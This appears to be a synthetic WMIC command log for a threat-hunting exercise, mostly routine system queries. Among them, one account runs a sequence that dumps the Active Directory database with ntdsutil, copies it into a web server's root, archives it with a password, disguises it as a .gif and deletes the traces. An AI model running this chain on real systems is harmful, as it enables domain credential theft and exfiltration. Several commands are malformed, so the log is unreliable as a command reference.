2024-03-30T18:30:29 | june-exec | server-02-main | 192.168.1.188 | wmic memorychip get capacity | executed | success |
2024-03-28T17:47:45 | june-exec | server-02-main | 192.168.1.160 | wmic sounddev get status | executed | success |
2024-03-28T17:33:40 | dean-admin | server-01-main | 192.168.1.159 | wmic product get name, version | executed | success |
2024-03-28T17:04:30 | dean-admin | server-02-main | 192.168.1.123 | wmic os get lastbootuptime | executed | success |
2024-03-28T17:00:31 | claire-exec | server-02-main | 192.168.1.195 | wmic os get lastbootuptime | executed | success |
2024-03-28T16:52:55 | dean-admin | server-02-main | 192.168.1.110 | wmic process call create "calc.exe" | executed | success |
2024-03-28T16:32:59 | june-exec | server-02-main | 192.168.1.137 | wmic startup get location | executed | success |
2024-03-28T16:22:54 | bill-exec | server-02-main | 192.168.1.119 | wmic printer get name status" | executed | success |
2024-03-28T15:49:30 | dean-admin | server-02-main | 192.168.1.161 | wmic os get installdate | executed | success |
2024-03-28T15:45:25 | claire-exec | server-01-main | 192.168.1.150 | wmic printer get name | executed | success |
2024-03-28T15:32:11 | sophie-engineering | engineering-01-main | 192.168.1.189 | wmic cpu get caption | executed | success |
2024-03-28T15:18:12 | june-exec | server-01-main | 192.168.1.177 | wmic netlogin get lastlogon | executed | success |
2024-03-28T14:59:37 | bill-exec | server-02-main | 192.168.1.113 | wmic logicaldisk where drivetype=3 get deviceid, freespace | executed | success |
2024-03-28T14:30:18 | claire-exec | server-01-main | 192.168.1.164 | wmic service list brief | executed | success |
2024-03-28T14:27:55 | dean-admin | server-02-main | 192.168.1.124 | wmic process list full | executed | success |
2024-03-28T14:26:25 | dean-admin | server-02-main | 192.168.1.103 | wmic path get all | executed | success |
2024-03-28T14:03:26 | june-exec | server-02-main | 192.168.1.105 | wmic nicconfig get ipaddress | executed | success |
2024-03-28T13:38:45 | dean-admin | server-01-main | 192.168.1.177 | wmic bios get version | executed | success |
2024-03-28T13:15:12 | claire-exec | server-02-main | 192.168.1.182 | wmic memorychip get capacity | executed | success |
2024-03-28T13:10:21 | bill-exec | server-02-main | 192.168.1.124 | wmic useraccount where name="bill-exec" get disabled | executed | success |
2024-03-28T12:49:10 | dean-admin | server-02-main | 192.168.1.198 | wmic process where processid='1234' call terminate | executed | success |
2024-03-28T12:48:40 | june-exec | server-01-main | 192.168.1.129 | wmic printer where systemname="\\\\workstation64" get name | executed | success |
2024-03-28T12:19:55 | dean-admin | server-01-main | 192.168.1.105 | wmic cpu get maxclockspeed | executed | success |
2024-03-28T12:00:05 | claire-exec | server-01-main | 192.168.1.122 | wmic cpu get caption | executed | success |
2024-03-28T11:47:03 | bill-exec | server-01-main | 192.168.1.111 | wmic netlogin where (name="bill-exec" and fullname="Bill Executive") get name, lastlogon | executed | success |
2024-03-28T11:38:45 | dean-admin | server-01-main | 192.168.1.108 | wmic os get csname | executed | success |
2024-03-28T11:33:54 | june-exec | server-01-main | 192.168.1.123 | wmic memorychip get devicelocator | executed | success |
2024-03-28T11:21:05 | sophie-engineering | engineering-01-main | 192.168.1.173 | wmic diskdrive get status | executed | success |
2024-03-28T10:55:30 | dean-admin | server-02-main | 192.168.1.187 | wmic os get version | executed | success |
2024-03-28T10:45:21 | sophie-engineering | engineering-01-main | 192.168.1.121 | wmic fan get status | executed | success |
2024-03-28T10:44:59 | claire-exec | server-02-main | 192.168.1.191 | wmic qfe list | executed | success |
2024-03-28T10:42:15 | dean-admin | server-01-main | 192.168.1.151 | wmic bios get serialnumber | executed | success |
2024-03-28T10:19:08 | june-exec | server-02-main | 192.168.1.119 | wmic process where name="explorer.exe" get commandline | executed | success |
2024-03-28T10:15:20 | dean-admin | server-02-main | 192.168.1.149 | wmic nic get netconnectionid | executed | success |
2024-03-28T09:58:49 | bill-exec | server-02-main | 192.168.1.130 | wmic process where name="explorer.exe" call terminate | executed | success |
2024-03-28T09:29:52 | claire-exec | server-02-main | 192.168.1.137 | wmic netlogin get lastlogon | executed | success |
2024-03-28T09:10:10 | dean-admin | server-01-main | 192.168.1.194 | wmic logicaldisk get freespace, caption | executed | success |
2024-03-28T09:04:21 | june-exec | server-01-main | 192.168.1.152 | wmic os get lastbootuptime | executed | success |
2024-03-28T08:55:10 | dean-admin | server-01-main | 192.168.1.130 | wmic os get localdatetime | executed | success |
2024-03-28T08:38:15 | dean-admin | server-01-main | 192.168.1.132 | wmic qfe get hotfixid, installedon | executed | success |
2024-03-28T08:21:35 | bill-exec | server-01-main | 192.168.1.104 | wmic process call create "cmd.exe /c dir" | executed | success |
2024-03-28T08:16:40 | dean-admin | server-01-main | 192.168.1.115 | wmic cpu get name | executed | success |
2024-03-28T08:14:46 | claire-exec | server-01-main | 192.168.1.103 | wmic logicaldisk get description | executed | success |
2024-03-28T07:59:42 | sophie-engineering | engineering-02-main | 192.168.1.109 | wmic os get lastbootuptime | executed | success |
2024-03-28T07:59:39 | claire-exec | server-02-main | 192.168.1.176 | wmic startup get command | executed | success |
2024-03-28T07:54:30 | dean-admin | server-01-main | 192.168.1.169 | wmic os get organization | executed | success |
2024-03-28T07:49:35 | june-exec | server-02-main | 192.168.1.195 | wmic product get name | executed | success |
2024-03-28T07:32:34 | claire-exec | server-01-main | 192.168.1.156 | wmic sysdriver get displayname | executed | success |
2024-03-28T07:30:40 | dean-admin | server-02-main | 192.168.1.159 | wmic service list brief | executed | success |
2024-03-28T06:51:20 | dean-admin | server-02-main | 192.168.1.192 | wmic logicaldisk get size,caption | executed | success |
2024-03-28T06:44:17 | bill-exec | server-02-main | 192.168.1.135 | wmic os get lastbootuptime | executed | success |
2024-03-28T06:34:49 | june-exec | server-01-main | 192.168.1.145 | wmic bios get serialnumber | executed | success |
2024-03-28T05:20:02 | june-exec | server-02-main | 192.168.1.143 | wmic qfe get hotfixid | executed | success |
2024-03-28T04:05:16 | june-exec | server-01-main | 192.168.1.132 | wmic printer get name | executed | success |
2024-03-28T02:50:30 | june-exec | server-02-main | 192.168.1.168 | wmic startup get command | executed | success |
2024-03-28T01:35:43 | june-exec | server-01-main | 192.168.1.114 | wmic logicaldisk get caption | executed | success |
2024-03-28T00:20:57 | june-exec | server-01-main | 192.168.1.170 | wmic volume get label | executed | success |
2024-03-27T23:47:38 | sophie-engineering | engineering-01-main | 192.168.1.169 | wmic bios get version | executed | success |
2024-03-27T23:06:11 | june-exec | server-02-main | 192.168.1.185 | wmic netlogin get fullname | executed | success |
2024-03-27T21:51:25 | june-exec | server-01-main | 192.168.1.180 | wmic csproduct get vendor | executed | success |
2024-03-27T20:36:38 | june-exec | server-02-main | 192.168.1.154 | wmic idecontroller get name | executed | success |
2024-03-27T20:08:44 | dean-admin | server-01-main | 192.168.1.128 | wmic os get LocalDateTime, LastBootUpTime | executed | success |
2024-03-27T20:04:26 | dean-admin | server-02-main | 192.168.1.102 | wmic process call create "notepad.exe" | executed | success |
2024-03-27T19:57:48 | dean-admin | server-02-main | 192.168.1.149 | wmic logicaldisk where Name="C:" get VolumeName, FileSystem, Size | executed | success |
2024-03-27T19:33:21 | dean-admin | server-01-main | 192.168.1.186 | wmic netuse where LocalDevice="Z:" get RemoteResource | executed | success |
2024-03-27T19:32:52 | dean-admin | server-02-main | 192.168.1.191 | wmic startupcommand get Name, Command | executed | success |
2024-03-27T19:21:52 | june-exec | server-01-main | 192.168.1.107 | wmic service where state="running" get name | executed | success |
2024-03-27T18:54:29 | dean-admin | server-01-main | 192.168.1.180 | wmic logicaldisk where DriveType="3" get Name, FreeSpace | executed | success |
2024-03-27T18:36:52 | bill-exec | server-02-main | 192.168.1.121 | wmic service where name="winmgmt" call startservice | executed | success |
2024-03-27T18:30:03 | june-exec | server-02-main | 192.168.1.123 | wmic memorychip get capacity | executed | success |
2024-03-27T18:15:29 | sophie-engineering | engineering-02-main | 192.168.1.181 | wmic logicaldisk get size | executed | success |
2024-03-27T18:11:37 | dean-admin | server-02-main | 192.168.1.145 | wmic process where Name="chrome.exe" get ProcessId, CommandLine | executed | success |
2024-03-27T18:07:28 | dean-admin | server-01-main | 192.168.1.123 | wmic process where Name="chrome.exe" get ProcessId | executed | success |
2024-03-27T18:07:06 | june-exec | server-01-main | 192.168.1.186 | wmic startupcommand get command | executed | success |
2024-03-27T18:03:43 | claire-exec | server-02-main | 192.168.1.178 | wmic cpu get name | executed | success |
2024-03-27T17:43:21 | dean-admin | server-01-main | 192.168.1.145 | wmic process list | executed | success |
2024-03-27T17:30:47 | dean-admin | server-01-main | 192.168.1.172 | wmic path win32_networkadapterconfiguration where IPEnabled=true get IPAddress, DefaultIPGateway | executed | success |
2024-03-27T17:25:14 | dean-admin | server-01-main | 192.168.1.126 | wmic startup get Location, Command | executed | success |
2024-03-27T16:55:29 | bill-exec | server-02-main | 192.168.1.194 | wmic process where name="chrome.exe" get processid | executed | success |
2024-03-27T16:52:19 | june-exec | server-02-main | 192.168.1.126 | wmic partition get size | executed | success |
2024-03-27T16:47:35 | claire-exec | server-02-main | 192.168.1.146 | wmic printer get name | executed | success |
2024-03-27T16:45:21 | june-exec | server-01-main | 192.168.1.180 | wmic bios get serialnumber | executed | success |
2024-03-27T16:39:17 | dean-admin | server-01-main | 192.168.1.104 | wmic service call changeover "Windows Update" | executed | success |
2024-03-27T16:18:07 | dean-admin | server-01-main | 192.168.1.167 | wmic os get LastBootUpTime | executed | success |
2024-03-27T16:15:38 | dean-admin | server-01-main | 192.168.1.177 | wmic cpu get Name,CurrentClockSpeed, MaxClockSpeed | executed | success |
2024-03-27T15:59:47 | dean-admin | server-02-main | 192.168.1.133 | wmic bios get Manufacturer, Version | executed | success |
2024-03-27T15:45:12 | dean-admin | server-01-main | 192.168.1.151 | wmic nicconfig get Description,MACAddress, IPAddress | executed | success |
2024-03-27T15:37:33 | june-exec | server-02-main | 192.168.1.106 | wmic netprotocolex get caption | executed | success |
2024-03-27T15:37:04 | dean-admin | server-02-main | 192.168.1.165 | wmic process where CommandLine="wmic" get ProcessId | executed | success |
2024-03-27T15:11:12 | bill-exec | server-01-main | 192.168.1.126 | wmic netlogin where name="bill-exec" set passwordexpires=false | executed | success |
2024-03-27T15:10:59 | dean-admin | server-02-main | 192.168.1.175 | wmic logicaldisk get Name, FreeSpace, Size | executed | success |
2024-03-27T15:04:53 | claire-exec | server-01-main | 192.168.1.104 | wmic service get pathname | executed | success |
2024-03-27T14:55:10 | june-exec | server-01-main | 192.168.1.102 | wmic diskdrive get model | executed | success |
2024-03-27T14:52:30 | dean-admin | server-01-main | 192.168.1.105 | wmic logicaldisk where DriveType=3 get DeviceID, VolumeName, FileSystem, Size | executed | success |
2024-03-27T14:29:38 | dean-admin | server-02-main | 192.168.1.122 | wmic logicaldisk get Size | executed | success |
2024-03-27T14:27:04 | claire-exec | server-02-main | 192.168.1.149 | wmic printer get portname | executed | success |
2024-03-27T14:22:47 | june-exec | server-01-main | 192.168.1.159 | wmic sounddev get status | executed | success |
2024-03-27T14:12:59 | dean-admin | server-02-main | 192.168.1.157 | wmic service list | executed | success |
2024-03-27T13:58:30 | dean-admin | server-02-main | 192.168.1.169 | wmic process where ProcessId="1234" delete | executed | success |
2024-03-27T13:49:21 | sophie-engineering | engineering-01-main | 192.168.1.110 | wmic printer get name | executed | success |
2024-03-27T13:42:18 | dean-admin | server-01-main | 192.168.1.156 | wmic process get Caption, ProcessId, CommandLine | executed | success |
2024-03-27T13:41:58 | bill-exec | server-01-main | 192.168.1.108 | wmic process where processid=234 call terminate | executed | success |
2024-03-27T13:12:14 | claire-exec | server-01-main | 192.168.1.190 | wmic nicconfig get ipaddress | executed | success |
2024-03-27T13:07:59 | june-exec | server-01-main | 192.168.1.128 | wmic startup get location | executed | success |
2024-03-27T13:05:33 | dean-admin | server-02-main | 192.168.1.125 | wmic printer where Default=True get Name,PortName | executed | success |
2024-03-27T12:56:39 | dean-admin | server-01-main | 192.168.1.149 | wmic service where Caption="Windows Management Instrumentation" get StartMode | executed | success |
2024-03-27T12:48:36 | dean-admin | server-02-main | 192.168.1.116 | wmic process where CommandLine="notepad.exe" get ProcessId, ExecutablePath | executed | success |
2024-03-27T12:41:04 | dean-admin | server-01-main | 192.168.1.113 | wmic os get FreePhysicalMemory | executed | success |
2024-03-27T12:40:49 | june-exec | server-02-main | 192.168.1.133 | wmic logicaldisk get description | executed | success |
2024-03-27T12:09:42 | bill-exec | server-01-main | 192.168.1.123 | wmic process call create "cmd.exe /c mkdir storage_temp" | executed | success |
2024-03-27T12:05:37 | dean-admin | server-01-main | 192.168.1.131 | wmic os get TotalVisibleMemorySize, FreePhysicalMemory | executed | success |
2024-03-27T11:53:12 | june-exec | server-02-main | 192.168.1.197 | wmic netlogin get lastlogon | executed | success |
2024-03-27T11:47:33 | dean-admin | server-01-main | 192.168.1.179 | wmic product get Name, Version | executed | success |
2024-03-27T11:39:26 | claire-exec | server-02-main | 192.168.1.172 | wmic qfe get caption | executed | success |
2024-03-27T11:39:25 | dean-admin | server-02-main | 192.168.1.184 | wmic cpu get NumberOfCores, NumberOfLogicalProcessors | executed | success |
2024-03-27T11:25:36 | dean-admin | server-02-main | 192.168.1.137 | wmic product where Name="Java" get Version | executed | success |
2024-03-27T11:22:21 | dean-admin | server-01-main | 192.168.1.181 | wmic datafile where Drive="C:" get Name, FileSize | executed | success |
2024-03-27T11:10:59 | dean-admin | server-02-main | 192.168.1.196 | wmic os get TotalVirtualMemorySize | executed | success |
2024-03-27T10:38:25 | june-exec | server-01-main | 192.168.1.116 | wmic nicconfig get ipaddress | executed | success |
2024-03-27T10:37:26 | bill-exec | server-01-main | 192.168.1.106 | wmic useraccount where name="bill-exec" get description | executed | success |
2024-03-27T10:36:59 | dean-admin | server-01-main | 192.168.1.191 | wmic path softwarelicensingservice get OA3xOriginalProductKey | executed | success |
2024-03-27T10:05:14 | dean-admin | server-02-main | 192.168.1.119 | wmic logicaldisk get Description | executed | success |
2024-03-27T09:58:04 | dean-admin | server-02-main | 192.168.1.123 | wmic printer where Network=True get Name, PortName | executed | success |
2024-03-27T09:55:26 | claire-exec | server-02-main | 192.168.1.194 | wmic qfe get hotfixid | executed | success |
2024-03-27T09:52:37 | june-exec | server-01-main | 192.168.1.141 | wmic os get version | executed | success |
2024-03-27T09:36:45 | dean-admin | server-01-main | 192.168.1.142 | wmic useraccount list brief | executed | success |
2024-03-27T09:24:50 | dean-admin | server-02-main | 192.168.1.155 | wmic qfe get HotfixID | executed | success |
2024-03-27T09:23:39 | june-exec | server-01-main | 192.168.1.191 | wmic printer where systemname="\\\\workstation64" get name | executed | success |
2024-03-27T09:20:27 | dean-admin | server-02-main | 192.168.1.120 | wmic os get Version,InstallDate | executed | success |
2024-03-27T08:59:11 | bill-exec | server-01-main | 192.168.1.114 | wmic process create "cmd.exe /c echo This is a test" | executed | success |
2024-03-27T08:51:12 | dean-admin | server-01-main | 192.168.1.187 | wmic startup get Caption, Command | executed | success |
2024-03-27T08:34:53 | sophie-engineering | engineering-02-main | 192.168.1.123 | wmic qfe get hotfixid | executed | success |
2024-03-27T08:29:47 | sophie-engineering | engineering-02-main | 192.168.1.189 | wmic temperature get currentreading | executed | success |
2024-03-27T08:25:52 | dean-admin | server-02-main | 192.168.1.143 | wmic service where State="Running" get Caption, StartMode, PathName | executed | success |
2024-03-27T08:08:52 | june-exec | server-02-main | 192.168.1.136 | wmic memorychip get devicelocator | executed | success |
2024-03-27T07:56:38 | bill-exec | server-01-main | 192.168.1.130 | wmic os get lastbootuptime | executed | success |
2024-03-27T07:40:15 | dean-admin | server-02-main | 192.168.1.148 | wmic bios get SerialNumber,Manufacturer,Version | executed | success |
2024-03-27T07:21:23 | claire-exec | server-01-main | 192.168.1.125 | wmic os get version | executed | success |
2024-03-27T07:10:15 | june-exec | server-02-main | 192.168.1.176 | wmic cpu get caption | executed | success |
2024-03-27T06:54:05 | june-exec | server-02-main | 192.168.1.118 | wmic process where name="explorer.exe" get commandline | executed | success |
2024-03-27T05:39:18 | june-exec | server-01-main | 192.168.1.103 | wmic os get lastbootuptime | executed | success |
2024-03-27T05:33:30 | claire-exec | server-01-main | 192.168.1.152 | wmic sounddev get status | executed | success |
2024-03-27T04:25:43 | june-exec | server-01-main | 192.168.1.197 | wmic printer get name | executed | success |
2024-03-27T04:24:31 | june-exec | server-02-main | 192.168.1.172 | wmic product get name | executed | success |
2024-03-27T04:10:42 | claire-exec | server-01-main | 192.168.1.104 | wmic bios get name | executed | success |
2024-03-26T23:55:38 | june-exec | server-02-main | 192.168.1.191 | wmic path win32_videocontroller get name | executed | success |
2024-03-26T23:33:03 | claire-exec | server-01-main | 192.168.1.116 | wmic os get lastbootuptime | executed | success |
2024-03-26T23:12:47 | sophie-engineering | engineering-01-main | 192.168.1.186 | wmic netlogin get fullname | executed | success |
2024-03-26T22:17:55 | sophie-engineering | engineering-01-main | 192.168.1.155 | wmic environment get name,variablevalue | executed | success |
2024-03-26T21:33:59 | june-exec | server-01-main | 192.168.1.124 | wmic netlogin get fullname | executed | success |
2024-03-26T21:12:19 | claire-exec | server-02-main | 192.168.1.177 | wmic startup get name | executed | success |
2024-03-26T21:02:45 | dean-admin | server-01-main | 192.168.1.191 | wmic service list brief | executed | success |
2024-03-26T21:02:09 | dean-admin | server-01-main | 192.168.1.171 | wmic cpu get maxclockspeed | executed | success |
2024-03-26T20:14:07 | claire-exec | server-01-main | 192.168.1.183 | wmic service get name | executed | success |
2024-03-26T19:50:10 | dean-admin | server-02-main | 192.168.1.145 | wmic diskdrive get mediatype, model | executed | success |
2024-03-26T19:40:22 | june-exec | server-01-main | 192.168.1.177 | wmic qfe get hotfixid | executed | success |
2024-03-26T19:10:37 | dean-admin | server-02-main | 192.168.1.193 | wmic qfe list | executed | success |
2024-03-26T18:39:01 | claire-exec | server-02-main | 192.168.1.119 | wmic process get caption | executed | success |
2024-03-26T18:28:18 | dean-admin | server-01-main | 192.168.1.184 | wmic service where "Name='RpcSs'" call startservice | executed | success |
2024-03-26T18:26:38 | dean-admin | server-01-main | 192.168.1.126 | wmic startup get command | executed | success |
2024-03-26T18:10:55 | dean-admin | server-01-main | 192.168.1.174 | wmic process where "Name='notepad++.exe'" get processid | executed | success |
2024-03-26T18:05:35 | sophie-engineering | engineering-02-main | 192.168.1.125 | wmic powermeter get frequency | executed | success |
2024-03-26T17:54:29 | dean-admin | server-01-main | 192.168.1.126 | wmic useraccount list full & wmic useraccount get Name, PasswordExpires | executed | success |
2024-03-26T17:49:28 | dean-admin | server-01-main | 192.168.1.120 | wmic bios get manufacturer,version | executed | success |
2024-03-26T17:40:26 | dean-admin | server-02-main | 192.168.1.140 | wmic process where "workingsetsize > 100000000" get processid | executed | success |
2024-03-26T17:36:07 | dean-admin | server-02-main | 192.168.1.152 | wmic service where "Name='LanmanServer'" call startservice | executed | success |
2024-03-26T17:21:42 | dean-admin | server-01-main | 192.168.1.185 | wmic nteventlog where logfileName="Application" list brief | executed | success |
2024-03-26T17:15:48 | june-exec | server-02-main | 192.168.1.119 | wmic process get caption | executed | success |
2024-03-26T17:14:41 | dean-admin | server-01-main | 192.168.1.195 | wmic nic where netconnectionid="Local Area Connection" get macaddress | executed | success |
2024-03-26T17:02:05 | dean-admin | server-02-main | 192.168.1.106 | wmic bios get serialnumber | executed | success |
2024-03-26T16:42:59 | claire-exec | server-02-main | 192.168.1.158 | wmic sounddev get caption | executed | success |
2024-03-26T16:24:47 | dean-admin | server-02-main | 192.168.1.115 | wmic product get name,version | executed | success |
2024-03-26T16:04:18 | dean-admin | server-01-main | 192.168.1.131 | wmic process where "Name='spoolsv.exe'" get processid | executed | success |
2024-03-26T15:47:53 | dean-admin | server-01-main | 192.168.1.128 | wmic service where "Name='wuauserv'" call startservice | executed | success |
2024-03-26T15:32:49 | dean-admin | server-01-main | 192.168.1.160 | wmic csproduct get vendor, version | executed | success |
2024-03-26T15:30:25 | dean-admin | server-02-main | 192.168.1.155 | wmic process where "Name='winlogon.exe'" get processid | executed | success |
2024-03-26T15:22:37 | june-exec | server-01-main | 192.168.1.166 | wmic product get name | executed | success |
2024-03-26T15:12:59 | dean-admin | server-02-main | 192.168.1.107 | wmic computersystem list /Format & wmic computersystem get Name, NumberOfProcessors, PrimaryOwnerName | executed | success |
2024-03-26T14:05:59 | dean-admin | server-01-main | 192.168.1.154 | wmic nic get name,speed | executed | success |
2024-03-26T13:58:37 | dean-admin | server-02-main | 192.168.1.194 | wmic service where "Name='Dnscache'" call startservice & wmic service where state=”running” get name | executed | success |
2024-03-26T13:45:21 | claire-exec | server-01-main | 192.168.1.114 | wmic bios get serialnumber | executed | success |
2024-03-26T13:44:59 | june-exec | server-01-main | 192.168.1.108 | wmic startup get command | executed | success |
2024-03-26T13:24:29 | sophie-engineering | engineering-01-main | 192.168.1.118 | wmic service get name | executed | success |
2024-03-26T13:17:28 | dean-admin | server-02-main | 192.168.1.136 | wmic cpu get deviceid, numberofcores | executed | success |
2024-03-26T12:40:12 | dean-admin | server-02-main | 192.168.1.156 | wmic process where "Name='explorer.exe'" get processid | executed | success |
2024-03-26T12:37:18 | dean-admin | server-02-main | 192.168.1.169 | wmic logicaldisk where drivetype=3 get freespace,caption | executed | success |
2024-03-26T12:29:45 | dean-admin | server-01-main | 192.168.1.195 | wmic nic get MACAddress, NetConnectionID | executed | success |
2024-03-26T12:27:49 | dean-admin | server-02-main | 192.168.1.179 | wmic process where "Name='svchost.exe'" get processid | executed | success |
2024-03-26T11:45:02 | dean-admin | server-01-main | 192.168.1.110 | wmic qfe get HotFixID, Description | executed | success |
2024-03-26T11:30:27 | june-exec | server-02-main | 192.168.1.150 | wmic share get name | executed | success |
2024-03-26T11:12:47 | dean-admin | server-01-main | 192.168.1.168 | wmic get MACAddress, IPAddress, DHCPEnabled, DHCPLeaseExpires, DHCPLeaseObtained, DHCPServer & nic get AdapterType, AutoSense, Name | executed | success |
2024-03-26T11:11:01 | dean-admin | server-01-main | 192.168.1.168 | wmic nicconfig where index=1 call enablestatic (“192.168.1.100”, “255.255.255.0”) | executed | success |
2024-03-26T11:09:21 | dean-admin | server-01-main | 192.168.1.168 | wmic nicconfig where "Description='Ethernet'" get ipaddress | executed | success |
2024-03-26T10:57:45 | claire-exec | server-02-main | 192.168.1.137 | wmic qfe get hotfixid | executed | success |
2024-03-26T10:55:33 | dean-admin | server-01-main | 192.168.1.155 | wmic service where "Name='RemoteRegistry'" call startservice | executed | success |
2024-03-26T10:12:04 | dean-admin | server-01-main | 192.168.1.143 | wmic os get totalvisiblememorysize | executed | success |
2024-03-26T10:06:21 | dean-admin | server-02-main | 192.168.1.177 | wmic cpu get Architecture | executed | success |
2024-03-26T09:40:28 | dean-admin | server-02-main | 192.168.1.130 | wmic path win32_printer get name, drivername, portname | executed | success |
2024-03-26T09:25:38 | dean-admin | server-02-main | 192.168.1.180 | wmic service get name, startname | executed | success |
2024-03-26T09:21:40 | dean-admin | server-02-main | 192.168.1.112 | wmic os get lastbootuptime | executed | success |
2024-03-26T09:15:33 | june-exec | server-01-main | 192.168.1.184 | wmic service get name | executed | success |
2024-03-26T09:07:17 | sophie-engineering | engineering-01-main | 192.168.1.145 | wmic startup get caption | executed | success |
2024-03-26T08:45:31 | dean-admin | server-02-main | 192.168.1.125 | wmic cpu get loadpercentage | executed | success |
2024-03-26T08:42:15 | dean-admin | server-01-main | 192.168.1.140 | wmic useraccount list full | executed | success |
2024-03-26T08:29:37 | claire-exec | server-01-main | 192.168.1.196 | wmic startup get command | executed | success |
2024-03-26T08:29:08 | dean-admin | server-01-main | 192.168.1.177 | wmic group list | executed | success |
2024-03-26T08:23:34 | june-exec | server-02-main | 192.168.1.162 | wmic nicconfig get ipaddress | executed | success |
2024-03-26T08:00:15 | dean-admin | server-01-main | 192.168.1.184 | wmic nicconfig get IPAddress, DefaultIPGateway | executed | success |
2024-03-26T07:59:49 | dean-admin | server-01-main | 192.168.1.135 | wmic os get freephysicalmemory | executed | success |
2024-03-26T07:42:59 | dean-admin | server-01-main | 192.168.1.196 | wmic partition get name, size | executed | success |
2024-03-26T07:30:12 | dean-admin | server-01-main | 192.168.1.193 | wmic printer get name, portname, sharename | executed | success |
2024-03-26T02:04:28 | dean-admin | server-02-main | 192.168.1.129 | wmic /node:webserver-01 process call create "cmd.exe rd /S C:\Windows\Temp" | executed | success |
2024-03-26T02:02:35 | dean-admin | server-02-main | 192.168.1.129 | wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif" | executed | success |
2024-03-26T00:33:46 | dean-admin | server-02-main | 192.168.1.153 | wmic os get lastbootuptime | executed | success |
2024-03-26T00:25:45 | dean-admin | server-02-main | 192.168.1.153 | wmic datafile where "drive='C:' and path='\\Windows\\' and lastmodified >= '20240301000000.000000-000' and lastmodified < '20240302000000.000000-000'" get name, size, lastmodified | executed | success |
2024-03-26T00:02:45 | dean-admin | server-02-main | 192.168.1.153 | wmic datafile where "drive='C:' and path='\\Windows\\'" get name, size | executed | success |
2024-03-25T23:47:07 | dean-admin | server-02-main | 192.168.1.153 | wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit” | executed | success |
2024-03-25T23:17:26 | dean-admin | server-02-main | 192.168.1.153 | wmic nteventlog get name,filename,maxfilesize | executed | success |
2024-03-25T22:52:19 | dean-admin | server-02-main | 192.168.1.153 | wmic timezone get description,bias,standardname | executed | success |
2024-03-25T22:45:27 | dean-admin | server-02-main | 192.168.1.153 | wmic /node:webserver-01 process call create “cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot” | executed | success |
2024-03-25T22:44:31 | dean-admin | server-02-main | 192.168.1.153 | wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit"" | executed | success |
2024-03-25T22:26:52 | dean-admin | server-02-main | 192.168.1.153 | wmic share get name,path,caption | executed | success |
2024-03-25T22:07:23 | dean-admin | server-02-main | 192.168.1.153 | wmic startup get caption,command,location | executed | success |
2024-03-25T22:04:57 | dean-admin | server-02-main | 192.168.1.153 | wmic memorychip get capacity,manufacturer,partnumber,speed | executed | success |
2024-03-25T21:32:25 | dean-admin | server-02-main | 192.168.1.153 | wmic logicaldisk where "DeviceID='\C:'" get description, freespace | executed | success |
2024-03-25T21:30:03 | dean-admin | server-02-main | 192.168.1.153 | wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename | executed | success | 
2024-03-25T19:28:41 | dean-admin | server-01-main | 192.168.1.150 | wmic useraccount list | executed | success |
2024-03-25T19:14:03 | claire-exec | server-01-main | 192.168.1.163 | wmic sounddev get status | executed | success |
2024-03-25T18:27:23 | dean-admin | server-01-main | 192.168.1.150 | wmic baseboard get Manufacturer, Product, Version, SerialNumber | executed | success |
2024-03-25T18:02:46 | bill-exec | server-02-main | 192.168.1.119 | wmic process get caption | executed | success |
2024-03-25T17:49:38 | sophie-engineering | engineering-01-main | 192.168.1.131 | wmic cpu get loadpercentage | executed | success |
2024-03-25T17:37:53 | dean-admin | server-02-main | 192.168.1.169 | wmic qfe get description, installedby | executed | success |
2024-03-25T17:21:03 | june-exec | server-02-main | 192.168.1.123 | wmic memorychip get capacity | executed | success |
2024-03-25T17:08:15 | claire-exec | server-02-main | 192.168.1.153 | wmic bios get version | executed | success |
2024-03-25T16:45:59 | june-exec | server-01-main | 192.168.1.173 | wmic logicaldisk get size | executed | success |
2024-03-25T16:45:31 | bill-exec | server-01-main | 192.168.1.145 | wmic logicaldisk get size | executed | success |
2024-03-25T15:40:27 | dean-admin | server-01-main | 192.168.1.122 | wmic process get | executed | success |
